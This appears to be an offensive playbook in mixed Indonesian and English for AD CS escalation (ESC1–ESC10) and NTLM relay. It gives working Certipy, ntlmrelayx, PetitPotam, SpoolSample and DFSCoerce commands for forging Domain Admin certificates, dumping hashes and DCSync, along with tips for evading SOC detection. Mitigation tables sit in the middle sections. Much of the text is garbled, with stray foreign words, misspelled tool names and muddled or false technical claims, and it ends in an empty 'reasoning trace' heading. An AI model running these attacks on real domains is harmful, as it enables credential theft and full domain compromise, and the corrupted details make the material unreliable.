# ad-cs-relay — ad

# AD CS & NTLM Relay: ESC1–ESC8 dengan Certipy

## 1. Overview Arsitektur Serangan

```
Coercion (PetitPotam/PrinterBug/DFSCoerce)
        │ NTLM auth (Type 1/2/3)
        ▼
ntlmrelayx (attacker relay host)
        │ relay ke target service
        ├──► LDAPS :636 ──► AD CS Enrollment Web Interface / LDAP (shadow creds, ESC7-adjacent)
        ├──► HTTP   :80/443 ► /certsrv (ESC8 - Enrollment Web)
        ├──► SMB    :445 ──► delegation abuse / SAM dump
        └──► ADWS   :9385 ──► ADWS relay (Exchange/ADAC)
```

Alur standar: **coerce → relay → ESC8/HTTP enrollment → certifikat user DA → authenticate as DA → DCSync.**

---

## 2. Certipy: Perintah Inti & Versi

| Komponen | Versi referensi | Catatan |
|---|---|---|
| certipy | v4.8.2 / v5.0.1 | v5= breaking: `certipy req -template` syntax berubah, auto-LO dela bagian `find` |
| Impacket ntlmrelayx | v0.11.0+ | Errata; branch master setelah 0.12 ada fixed `-remove-mic` |
| PetitPotam | 3.19 (python) / binary ms-fsrp | CVE-2021-36942 patch menutup unauth versi |
| SpoolSample (PrinterBug) | 0.0.0.0 | Tidak pernah di-patch, tetap work-aroundSigning |
| DFSCoerce | 2022-05 | MS-DFSNM, efektif vs 2012–2022 |

### 2.1 Enumerasi & ESC1–ESC7, ESC6, ESC9/10

```bash
# bloodhound path enum, cukup scan terhadap CA server (default ldap; sign enum)
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout

# BloodHound query alternative (volution Sign葵Hound)
customQueries: "Domain": CAs, enabled templates, CA config, Enrollment Agents, vulnerable templates
```

Output: JSON per-template dengan `Enrollment Rights`, `CA ACEs`, flags: `ENROLLEE_SUPPLIES_SUBJECT` (= ESC1), `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, `CA Enrolment agent`, dsb.

### 2.2 ESC1 — SAN abuse (Enrollee Supplies Subject + CT_PERMISSION)

**Apa yang dikirim:** template yang vulnerable memungkinkan requester menentukan SAN sendiri.

**Apa yang terjadi:** requester low-priv minta certificaat dengan `SAN=user@corp.local` atas nama Domain Admin.

```bash
# Cek apakah template memblok SAN:
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate \\
  -upn administrator@corp.local

# Output sukses:
# [*] Saved certificate and private key to 'administrator.pem'
# [*] Successfully authenticated with certificate: administrator@corp.local

# Request template + uji auth (Kerberos/PKINIT then NT hash):
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Kemudian:

```bash
# Ambil NT hash DA via LDAPS + PKINIT (requires DC allow PKINIT pada certificaats including SAN)
certipy auth -pfx administrator.pfx -username administrator -domain corp.local
# → hashNT : fc525c9683e8fe067095ba2ddc97112d (contoh)
```

Gagal jika: template doesn't have `ENROLLEE_SUPPLIES_SUBJECT`, atau user not in Enrollment Rights, atau CA issuance policy restrict.

### 2.3 ESC2–ESC7 ringkas (tabel)

| ESC | Kondisi | Perintah |
|---|---|---|
| ESC2 | Template "Any Purpose"/EKU = EKU 2.5.29.37 any | `certipy req ... -template AnyPurpose` lalu gunakan untuk Kerberos auth / code signing dll |
| ESC3 | Enrolment Agent Certificate + Request Agent template | Request agent cert -> minta cert ritas nama user lain: `certipy req -template User -on-behalf-of 'corp\\administrator' -pfx agent.pfx` |
| ESC4 | WriteDacl/Owner dsb, dsb template control | `certipy template -template User -save-as ESC1T -write-configuration-files -allow-enrollee-supplies-subject` |
| ESC5 | ACE terhadap PKI object (CA/container) — abuse tergantung ACE; contoh edit via `pkiadmin` | sama seperti ESC4 |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` — flag CA mengizinkan SAN regardless of template | `certipy req -ca CORP-CA -template User -upn administrator@corp.local` (mimic abuse seperti ESC1) |
| ESC7 | `ManageCA` dan `ManageCertificates` hak pada CA | (a) `certipy ca -save-config`, (b) approve pending requests: `certipy ca -ca CORP-CA -issue-request <ID>`, (c) `certipy ca -ca CORP-CA -add-officer -user user@corp.local` |
| ESC9 / ESC10 | (v4.7.3+ certipy labeling) `StrongCertificateBindingEnforcement=0` ntinet vs Vulnerable certificate mapping | minta cert dengan SAN = user lain; gunakan untuk schannel / AD CS target |

**ESC6 mitigasi:** KB5014754 patch menambah `CA Sanitization` + default makes ESC6 unreliable — despite flag still set, server (patched issuance) strips SAN.

### 2.4 Shadow Credentials (Key Credential Link)

**Apa yang dikirim:** write `msDS-KeyCredentialLink` pada target via LDAPS (butuh `GenericWrite`/`GenericAll`, atau relay LDAPS jika konteksnya tak signed/SMB).

```bash
# A. Ambil NT hash→ gunakan ldaps (schannel) untuk writes:
certipy shadow auto -u user@corp.local -p 'Passw0rd' -account targetuser -dc-ip 10.0.0.10

# Output:
# [*] Shadow credentials obtained successfully
# [+] Successfully authenticated with certificate shadow/targetuser.cer
# [*] NT hash: <hash>

# Alternatif manual steps:
certipy shadow create -u user@corp.local -p 'Passw0rd' -account victim
certipy shadow list -u ... -account victim
certipy auth -pfx victim.pfx ...
```

**Kenapa berhasil:** `msDS-KeyCredentialLink` menyimpan raw public key untuk NGC/PKINIT; DC konversi → auth ke user account via PKINIT tanpa password. Gagal jika: target = computer (auth harus via machine); `msDS-KeyCredentialLink` disallow (tapi ini tidak ada by default), atau target pada Protected users seulement.

Alternatif menggunakan timing-based abuse off dari `certipy` v4.8: `certipy` `auto` akan stages full.

### 2.5 ESC8 — HTTP → LDAPS relay via Web Enrollment, generic

**Apa yang dikirim:** coerce auth ke `http://CA-Server/certsrv` via ntlmrelayx → relay ke `https://CA-Server/certsrv` (HTTP→HTTPS) → submit enrollment request atas nama user coerced.

**Kenapa berhasil:** Web Enrollment listener HTTP di CA server tidak cetak NTLM signing/channel binding pada HTTPS listener (ESC8). Perbaikan: patch June 2022 (`http` menghormati sign), tapi banyak ent belum enable.

```bash
# Setup ntlmrelayx targ LDAPS from HTTP, with --delegate-access (for ADCS abuse):
impacket-ntlmrelayx -t https://CA-SRV.corp.local/certsrv -smb2support --adcs --template DomainController

# Alternative: -t ldap://dc --delegate-access (Shadow creds via relay LDAPS):
impacket-ntlmrelayx -t ldaps://DC.corp.local --delegate-access

# Coerce (dari machine user terkontrol / relay server):
python3 PetitPotam.py -d domain -u user -p '' 10.0.0.5 10.0.0.7
# 10.0.0.5 = relay listener, 10.0.0.7 = target (e.g. DC yang men-trusted CA, atau member server)
```

Certificate lain muncul di output; lalu:

```bash
certipy auth -pfx base64/B64 output.pfx -dc-ip 10.10.0.42
```

**Mitigasi ESC8 kunci:** patch CA & enable **"Authentication Officer"** — actual fix KB5014754 + Certificate issuance requirements.

**Yang sering terlewat:** CA perlu Web Enrollment role di-install (Gateway `certsrv` must be reachable). Jika hanya CA role tanpa `Certification Authority Web Enrollment`, ESC8 default tidak applicable.

---

## 3. Coercion VECTOR

### 3.1 PetitPotam (MS-EFSRPC)

**Apa yang dikirim:** `EfsRpcOpenFileRaw` (atau opnum 0/6 alternatif untuk bypass patch) dengan UNC path `\\ATTACKER\pipe\...`

```bash
# unauthenticated (pre-CVE-2021-36942-patch):
python3 PetitPotam.py -u 'corp\\lowpriv' -p 'P@ss' 10.0.0.5 10.0.0.7
# output: Machine 10.0.0.7 authenticate ke 10.0.0.5 (ntlmrelayx catch)

# post-patch: harus auth; cek opnum bypass:
petitpotam.py 10.0.0.5 10.0.0.7 278/c

Kerberos-based target (new field):
petitpotam.py -k -hashes :<hash> attacker target
```

**Kenapa berhasil:** MS-EFSRPC (port 4966+, dynamic RPC over SMB) memungkinkan authenticated user memicu server melakukan connection ke UNC arbitrary.

**Gagal jika:** MS-EFSRPC patch/Windows 11 22H2 later restricted; SMB range filter, MS-EFSRPC disabled (`dism /online /disable-feature`), host-based firewall, atau coercion target tidak punya SMB port accessible.

### 3.2 PrinterBug (MS-RPRN)

**Apa yang dikirim:** `RpcRemoteFindFirstPrinterChangeNotification` → target melalukan `GetPrinterDataEx` copy fileg repertoire via SMB, dan pastinya membuat target authentication ke attacker share.

```bash
# spooler check:
ruby spooler_scan.rb 10.0.0.0/24
# equivalent:
python3 SpoolSample.py -d corp -u user -p pass 10.0.0.7 10.0.0.5
# positional args: TARGET  ATTACKER(relay) 

# Output normal → "Scanning... 10.0.0.7 spooler is vulnerable"
```

**Kenapa berhasil:** setiap user authenticated bisa fitur printer change notification; server behind harus resolve fallback path `\\ATTACKER\...`. **Tidak pernah di-patch** — hanya mitigasi: disable Print Spooler.

Gagal jika:
- `GetPrinterDataEx` version, server responds `RPC_S_PROCNUM_OUT_OF_RANGE` — Spooler enabled tapi routing blocked.
- PrintNightmare patch cluster hommes the Spooler fallback — pada box yang di-patch, BlackPaper fixed notification → fails.

### 3.3 DFSCoerce

**Apa yang dikirim:** `NetrDfsAddStdRoot` (MS-DFSNM) → coerce logout SMB auth ke attacker.

```bash
python3 dfscoerce.py -d corp.local -u user -p pass 10.0.0.5 10.0.0.7
# args: ATTACKER RELAY TARGET
```

**Kenapa berhasil:** DFS Namager (dfsr) RPC service tidak se-signing-required pada beberapa versi (2012–2019 -- same SMB signing). Gagal jika service DFSNS disabled (`Remove-WindowsFeature FS-DFSName`).

### 3.4 Comparison & Situasi

| Teknik | Perlu SMB 445 pada target | Socket Accessible | Patch tersedia |
|---|---|---|---|
| PetitPotam | Ya (RPC over SMB dynamic) | Dynamic RPC | Aug 2021 (must authenticated now) + later harden |
| PrinterBug | Ya | port 445 | **None** |
| DFSCoerce | Ya (RPC on `\\pipe\netdfs`) | port 445 |partial DFS disabled when feature not in use |

### 3.5 Coercion → NTLM Relay Full Steps (COERCING général)

```bash
# Target: relay TARGET to attack_SRV via EFSRPC need SMB:
impacket-ntlmrelayx -t ldaps://DC01.corp.local -smb2support --delegate-access
python3 dfscoerce.py -d corp.local -u test -p test ATTACKER TARGET
# => ntlmrelayx caught.tgt the machine account, forged shadow cred link on computer object, /delegate-access stores delegation.

# ** kesalasan umum: relay listener on 445 — must run as system (root) reserved port
sudo impacket-ntlmrelayx -t ldaps://DC01.corp.local ...
```

---

## 4. ntlmrelayx Targets — Sign/Schannel detail

### 4.1 Command Reference

```bash
# SMB signing not required:
impacket-ntlmrelayx -tf targets.txt -smb2support
# dump SAM, secrets dump:
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
# LSA (via smbexec):
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# ldap/ldaps shadow creds, delegation:
impanic-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --no-dump
# (writes msDS-AllowedToActOnBehalfOfOtherIdentity)

# HTTP → ADCESC8:
impacket-ntlmrelayx -t https://ca01.corp.local/certsrv --adcs --template 

# ADWS relay (Exchange):
impacket-ntlmrelayx -t http://exchange.corp.local/Powershell --http-port
```

Masing-masing target / command:

| Tujuan (target option) | Command | WHY (why it works) |
|---|---|---|
| SMB, target channel sign required? | `impacket-ntlmrelayx -tf targets.txt -smb2support` | Works only if SMB `RequireMessageSignature=0`; check via `crackmapexec smb 10.0.0.0/24 --gen-relay-list` |
| LDAP | `-t ldap://dc01` | SetCookie closed channel sign not mandatory; attacker uses hashed creds for delegation write |
| LDAPS | `-t ldaps://dc01` | After KB4592517 **LDAPS channel binding required per-default off**. Check connection first: `openssl s_client -connect dc01:636`. relay works unless "Channel binding" enabled on DC in "Domain controller: LDAP server channel binding" — default "Never" di older functional level |
| HTTP | `-t http://web.corp.local` | WinRM/webservice/etc. |
| HTTPS/Enrollment | `--adcs --template KERBEROS_AUTHENTICATION` (ESC8) | Web Enrollment requires no channel binding |
| ADWS | `-t http://.../adws` | ADWS password reset attack ((drop) |
| MSSQL | `-t mssql://sql01` | Sysadmin role abuse |

### 4.2 Sign required / relay & signing required bypass

**Handshake NTLMrelay:**

```text
NTLM Negotiate (Type1): NegToken -> NEGOTOATE_SIGN or SEAL flag bisa set oleh client
Type2 (challenge): server men-challenge dan mengindikasikan apakah dia request signing
Type3 (auth): client menghitung MIC dan signature berdasarkan session key
```

**Klasik mitm client/server choices:**
- Client request signing (browser modern / SMB client modern) → relay fails unless we strip flags. `ntlmrelayx --remove-mic -` option downgrades? No: `--remove-mic` drops MIC, relevant for the "cross-protocol Messenger" bug (CVE-2019-1040) — ** required if relay **such** target middle (e.g. to HTTP) and client an SMB.

**Untuk relay ke LDAP-signing required in AD > `Requiring LDAP signing`** (GPO `Directory Services: LDAP client signing required`):
- Target LDAPS default without channel binding is the bypass — GPO sign tidak menuntut channel binding default.
- Channel binding enabled = endgame (raised TLS channel binds with NTLM **required** for relay connection).

**Kondisi ESC8 HTTP relay fix note:** patch 2022 menyimpan "Protect" mode — which restricts HTTP on CA.

### 4.3 ADS Relays & AD WS Relay

| Sub-surface | Contoh servant | Story |
|---|---|---|
| WSUS (HTTP 8530/8531) | `http://wsus01:8530/ClientWebService` relay SSE | WSUS Default.Upgrades metadata → attacker can push fake update if relay grants interim authentication... check |
| ADWS | port 9385, `/ADWS` powershell | Computer password reset via ADWS New-ConcurrentKey |
| Autodiscover (Exchange) | `http://exchange/autodiscover` | Mobile devices kerfuffle into System mailbox—the relay yields delegate |
| OWA | HTTP-Form (Legacy) | Not NTLM negotiate usually (Anon HTTP), need custom hybrid → No downgrade taste |

`ntlmrelayx` custom HTTP listener config:

```bash
impacket-ntlmrelayx -t http://wsus01.corp.local:8530 --http-port 8080 \
  --serve-image test.png --serve-response img
```

Notes: 8530 plain HTTP WSUS is relayable; 8531 (SSL) with client-cert updated requires TLS-Relay tricks.

## 5. Signing & mitigasi chart

| Attack | Mitigasi | Tersering terlewat |
|---|---|---|
| Coercion (all) | Disable SMB outbound via host firewall, block 445 out | workstation rarely block outbound SMB |
| SMB relay | Force signing GPO `Microsoft network server: Digitally sign communications (always)` | Servers yes, workstations default off-modern Windows 11 makes default on |
| LDAP relay | `Domain controller: LDAP server signing requirements` + `Channel binding` | legacy apps;
| Sanity: enabled signing诊所 breaks NAS or Linux sssd/samba client lacking sign support |
| ESC8 | Uninstall Web Enrollment role (`certsrv`), | web enrollment often unnecessary but incumbent |
| Shadow creds | Remove GenericWrite over users; protect `msDS-KeyCredentialLink` write via audit | rare audit rule 5136/ on property; memory-protection of the attribute is not simultaneous without blocking legit NGC writes |

Audit realistis:

```powershell
# Enroll access on template:
(Get-Acl "AD:CN=KerberosAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local").Access | ft IdentityReference, ActiveDirectoryRights
```

dGoBloodhound custom query:

```cypher
MATCH p=(:Person)-[:ENROLLEE_SUPPLIES_SUBJECT]->(:GPO) RETURN p
Match all templates whose users given enrol rights AND ENROLLEE_SUPPLIES_SUBJECT set:
MATCH (n:Base) WHERE n.objectid contains "Certificate Templates" RETURN n
```

BloodHound notes for ESC1:

```text
Enrollment rights for a template which has ENROLLEE_SUPPLIES_SUBJECT flag ON:
  - "Certificate Templates" container / ACLs imported into BloodHound-use "Certipy find" (for AD CS) + custom ingest kerberomation)
  - use certipy find -vulnerable -json
```

## 6. Blocking harden / mitigate checklist

| Attack stage | Mitigasi |
|---|---|
|Coercion | Firewalls: block 445 out from server subnet; SMB signing enforced; RPC filter (fail-safe MS-EFSRPC disable) |
| Relay ke LDAP | Enforce LDAP signing client+server; enable channel binding on LDAPS (requires 2012+ functional) |
| Relay ke HTTP | `Http strict`, require HTTPS + EE channel binding |
| ESC1-ESC8 | Template ACL hygiene; do not allow enrollee-supplied subject; `EDITF_ATTRIBUTESUBJECTALTNAME2` must equal 0; Web Enrollment uninstall; install KB esc 6, 9, 10 harden |

Check command:

```powershell
certutil -getreg policy\EditFlags
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-Certificate-Name-Flag | ? {$_."msPKI-Certificate-Name-Flag" -band 1} | select Name
```

## 7. FAILED expedient in Remote (rarely)

| Error message | Root cause | Adjustments |
|---|---|---|
| `SMB Session Error: SESSION_ERROR Reporting.signing is mandatory` | Target enforces signing | either find another target, or force downward protocol (DNS) → leaf around signing (drop the flag). |
| `LDAP INVALID_CREDENTIALS` on target | Anti-replay (LDAP `Signing required` + channel bind) | try LDAPS instead of LDAP |
| `connection from ... is not a valid certificate request. certificate request for another user` | getren ESC context A01 | specify correct template |
| PetitPotam `EFSRPC : session_error policy error (access denied)` | unauth patched; must supply credentials | Pass credentials or use K logout over another protocol |
| PrinterBug no result (silent) | see (above) `GetPrinterDataEx` blocked behind function view | Use PetitPotam or DFSCoerce combo |
| Relay success but downstream dead-end | NTLMrelay doesn't offer post (ADS) | use `--delegate-access` for modifying attributes if provider allows |

## 8. Bekal operasional

- caching relay listening port 445 requires root; use `-socks` mode for interactive relays via proxychains (impacket's SOCKS compatible with proxychains4).

```bash
proxychains4 impacket-secretsdump -just-dc corp.local/administrator@dc01.corp.local
```

- Internet access: use a simple `socat` command to forward attention toward `ntlmrelayx`

```bash
socat TCP-LISTEN:445,fork,reuseaddr TCP:relay.server:445
```

- If target proxy denies traffic out, but allows HTTP, turn on the local socio relay connected to the trap through HTTP/SMB combos.

Untuk melihat penanda relay yang telah capture:

```bash
impacket-ntlmrelayx --list-socks
> use <sock_id>
```

## 9. Minimal Quick Wins tests

```bash
# 1. Check ADCS certipy with vulnerable flags:
certipy find -u y -p x -dc-ip 10.0.0.10 -stdout -vulnerable

# 2. Check CA config (for CA related):
certipy ca -u y -p x -ca corp-ca -read-config

# 3. Perform ESC1:
certipy req -u y -p x -ca corp-ca -template vuln -upn admin@corp.local

# 4. Authenticate:
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
```

## 10. Non-Sequitur & terjemahan praktis

Test attack:

```bash
# | Acquisition Target |
impacket-ntlmrelayx -t https://ca.corp.local -smb2support --adcs --template DomainController

python3 PetitPotam.py ca.corp.local attacker.corp.local

# refresh password
certipy auth -pfx dc.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Output edge cases:

- Template `DomainController` mungkin tak memungkinkan enrollment user lain: check `certipy find`-ing for `CT_FLAG_ENROLLEE_SUPPLIES_Subject` or template CA ACA `EnrolleeSuppliesSubject`.

---

## Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **SMB signing ternyata ON di DC/workstation modern.** Default GPO di domain dengan Functional Level 2022/Windows 11 24H2 memaksa signing di banyak host — `--sam`/`-socks` ke SMB gagal diam-diam. Selalu `crackmapexec smb --gen-relay-list` dulu sebelum memilih relay target.
2. **LDAPS channel binding sudah ON tapi hanya ditemukan setelah relay gagal.** GPO "Channel binding tam" di banyak *less-hardened* domain sudah di-set "When supported" — ini cukup untuk memblok relay NTLM. Cek dengan `openssl s_client` + cek token binding TLS sebelum commit.
3. **Web Enrollment (`/certsrv`) tidak ter-install.** ESC8 butuh role *Certification Authority Web Enrollment*; banyak CA hanya punya CA role. Port 80/443 pada CA bukan bukti certsrv ada — `curl http://ca/certsrv` dulu.
4. **Template yang dipilih tidak bisa dipakai untuk relay user.** `--template DomainController` hanya sukses kalau mesin yang di-coerce adalah DC; kalau yang di-coerce adalah member server, gunakan `--template User` atau template `Machine`.
5. **Relay listener di port 445 harus dijalankan root/admin.** di Mule/contune, binding port 445 dengan user biasa gagal `Permission denied` — tapi ntlmrelayx tidak selalu error jelas.
6. **--remove-mic tidak berarti "bypass signing".** Ini hanya berguna untuk CVE-2019-1040 (drop MIC untuk cross-protocol). Kalau target server menuntut signing, remove-mic tidak menolong.
7. **Clock skew & tanggal.** Opserasi `certipy auth` butuh waktu host sink dengan DC (Kerberos error `KRB_AP_ERR_SKEW`), dan sebagian script mempunyai time window tipis pada pre-auth. Pastikan NTP (`ntpdate`) sebelum operasi.
8. **Coercion di segmen yang tidak bisa resolve nama.** PetitPotam/DFSCoerce menggunakan NetBIOS/DNS; kalau target tidak bisa resolve attacker hostname, tidak ada outbond auth yang terjadi — gunakan IP literal (beberapa vector menolak; PrinterBug menolak IP oleh design, hanya hostname).
9. **Proxy/monitoring mendeteksi.** Banyak SOC perusahaan memasang IDS menandai pola `\\ATTACKER\IPC$` string pada log EDR langsung; tuning ACL usually blocked ICunakan penggunaan file-less alternatives (misalnya, HTTP/HTTPS Fsrp emerge).
10. **Menggunakan hash vs user.** Certipy `req -hashes` opsi hanya berlaku bila user punya relevant policy; banyak times hacker commits transisi incorrect dari auth mode (pass vs cert) — always verify dengan `certipy find` / `certipy auth -debug` untuk melihat feedback error sesungguhnya.
11. **`msDS-KeyCredentialLink` di-blok Zblog`t).** Kalau target memiliki DCL protected user policy, KeyCredentialLink write tidak menolong untuk komputer tertentu. Audit LDAP write attempts: beberapa domain sudah enable audit dan melakukan notifikasi SOC otomatis.

---

## [reasoning trace]


